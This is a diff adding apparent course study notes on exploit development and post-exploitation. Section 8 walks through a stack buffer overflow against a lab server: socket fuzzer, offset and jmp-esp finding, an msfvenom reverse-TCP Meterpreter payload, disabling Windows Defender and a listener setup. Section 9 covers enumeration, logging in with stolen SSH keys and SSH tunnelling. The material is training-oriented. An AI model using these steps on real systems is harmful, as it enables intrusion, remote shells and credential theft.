@@ -356,8 +356,73 @@ Section 7: Exploit Development
                         - note that the program (whoami) will run with whatever permissions of whatever user is running the python program?/gdb program?)
 
 
+Section 8: Exploit Development?
+0. Determine exe of interest (python script)
+STATIC ANALYSIS
+1. strings [/path/to/exe/file] (determine what file, and if it's made for linux or windows)
+DYNAMIC ANALYSIS
+2. netstat -antp after running program (look for listening ports created)
+2a. wmic process where ExecutablePath='C:\\windows\\system32\\notepad.exe' get ProcessId
+3. vim [something.py]
+        #!/usr/bin/env python
+        import socket
+        buf = " "
+        s = socket.socket (socket.AF_INET, socket.SOCK_STREAM) ## Creating socket, IPv4 TCP
+        s.connect(("192.168.65.10",9999)) ##Define host and port
+        print s.recv(1024) ## Print to screen the response
+        s.send(buf) ## Send variable buf
+        print s.recv(1024) ## Print to screen the response
+        s.close() ## Close the socket
+4. It says "Enter HELP for help" so change the "buf" variable to "HELP"
+5. (vulnerable command is "TRUN [value]" where value = "/.:/")
+        buf = "TRUN /.:/"
+        buf += "A" * 5000
+6. Open Immunity Debugger as admin
+        - file > attach > exe (must be running the exe for it to show up)
+7. Run the modified python program while debugger is running by pressing little play button (you should see "AAAAAAAAAAAA" in the EAX & ESP)
+8. https://wiremask.eu/tools/buffer-overflow-pattern-generator/ (length 5000, copy output)
+9. replace "buf += "A" * 5000" with "buf += "[paste]""
+10. run again, copy EIP to clipboard, paste into wiremask register value, copy "Offset" value
+11. replace "buf += "[paste]"" with "buf += "A" * [offset value]"
+        - optionally, add another "buf += "BBBB"" so you can see if it works by looking for an EIP of "42424242" (hex for BBBB)
+        - make sure the delete the "BBBB" when you actually run it as an exploit
+12. if you got it, it worked. now you can run any command. ta-da!
+13. in the long white bar at the bottom of Immunity Debugger, run the command there
+        - !mona modules (or any command you want such as...)
+        - !mona jmp -r esp -m "essfunc.dll" > right click first entry > copy to clipboard > address
+                - convert to little endian ie. 625012A0 -> \xA0\x12\x50\x62
+14. add the following to the python, in addition to what's already there:
+        buf += "[little endian thingy]"
+        buf += "\x90" * 15
+15. run the following command on the linux box NOT running the vulnerable exe: msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.26.168 lport=4444 -b "\x00" -f python
+        - where lhost is NOT the box running the vulnerable exe (linux box)
+16. copy the resulting shellcode EXCEPT the first "buf =b""" line, paste into the python script after all other buffer stuff
+        - this buffer code translates to the vuln windows box connecting to a 4444 port on the linux machine, but you need to set up the 4444 listener on linux box first
+17. turn off all "virus and threat protection" settings on Windows Defender
+18. create 4444 meterpreter listener: run msfconsole on linux box
+        > use multi/handler
+        > set payload windows/meterpreter/reverse_tcp
+        > set LHOST 0.0.0.0
+        > set LPORT 4444
+        > run
+19. hit the little reverse rewind button on Immunity Debugger to reset the program to initial state, then run the python program again
+20. Tada! you should have a meterpreter session open on the linux box
 
 
-
-
+Section 9: Post-Exploitation
+- Enumeration Commands (Linux // Windows)
+        - cat /etc/passwd // net user
+        - /etc/hosts
+        - ps -elf // tasklist /v
+        - chkconfig (SysV) or systemctl --type=service (SystemD) // tasklist /svc
+        - ip a // ipconfig /all
+- Using stolen SSH keys:
+        - chmod 600 /home/student/stolenkey
+        - ssh -i /home/stdent/stolenkey jane@1.2.3.4 (tells SSH to utilize the specified stolen private key to authenticate with the jane@1.2.3.4 public key)
+- Nonsense:
+ssh -MS /tmp/jump student@10.50.xx.xx ##Tunnel
+ssh -S /tmp/jump jump -O forward -D 9050 ## Dynamic forwarding
+Found 1.2.3.4, now nmap/nc to find port 22 open
+ssh -S /tmp/jump jump -O forward -L4207:1.2.3.4:22 ## Port Forward
+scp -P 1212 file.sh student@localhost:/home/student/Documents ## SCP file.sh to remote host
 
